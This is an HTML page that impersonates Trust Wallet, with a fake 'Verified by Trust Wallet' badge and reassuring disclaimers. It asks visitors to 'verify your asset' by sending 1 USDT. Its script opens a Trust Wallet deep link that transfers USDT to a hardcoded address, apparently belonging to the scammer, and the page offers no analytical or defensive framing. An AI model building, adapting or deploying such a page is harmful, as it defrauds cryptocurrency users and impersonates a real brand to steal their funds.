<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verify Asset – Trust Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="favicon.ico" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f1f5ff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .card {
      background-color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .logo {
      width: 60px;
      margin-bottom: 10px;
    }

    h2 {
      color: #1e3a8a;
      margin-bottom: 10px;
    }

    p {
      color: #374151;
      font-size: 15px;
    }

    button {
      background-color: #1e40af;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 10px;
      font-size: 16px;
      margin-top: 15px;
      cursor: pointer;
      width: 100%;
    }

    .trust-badge {
      margin-top: 20px;
      font-size: 14px;
      color: #10b981;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .disclaimer {
      font-size: 12px;
      color: #6b7280;
      margin-top: 20px;
    }

    label {
      display: block;
      margin-top: 20px;
      font-size: 14px;
      color: #374151;
      text-align: left;
    }

    input[type="checkbox"] {
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="logo.png" class="logo" alt="Logo" />
    <h2>Please verify your asset</h2>
    <p>To continue, please verify by sending 1 USDT to our secure address.</p>

    <label>
      <input type="checkbox" id="agree" />
      I agree to the Terms and Privacy Policy
    </label>

    <button id="verifyBtn" disabled>Verify</button>

    <div class="trust-badge">
      <img src="logo.png" width="20" />
      <span>✅ Verified by Trust Wallet</span>
    </div>

    <p class="disclaimer">
      We never ask for your seed phrase or private key. This site uses secure smart contract methods.
    </p>
  </div>

  <script>
    const btn = document.getElementById("verifyBtn");
    const agree = document.getElementById("agree");

    agree.addEventListener("change", () => {
      btn.disabled = !agree.checked;
    });

    btn.addEventListener("click", () => {
      const trustLink = `https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955&amount=1`;

      // Open Trust Wallet for USDT transfer
      window.location.href = trustLink;
    });
  </script>
</body>
</html>
